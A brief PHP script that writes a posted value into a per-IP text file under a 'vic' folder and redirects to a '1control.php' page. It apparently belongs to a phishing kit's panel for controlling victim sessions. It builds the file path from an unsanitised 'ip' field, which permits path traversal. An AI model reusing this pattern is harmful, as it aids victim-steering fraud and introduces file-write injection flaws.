<?php
	
	if ($_POST['step'] == "control") {
        $fp = fopen('../../../vic/'. $_POST['ip'] .'.txt', 'wb');
        fwrite($fp, $_POST['to']);
        fclose($fp);
        header("location: ../../../1control.php?ip=". $_POST['ip']);
        exit();
    }

?>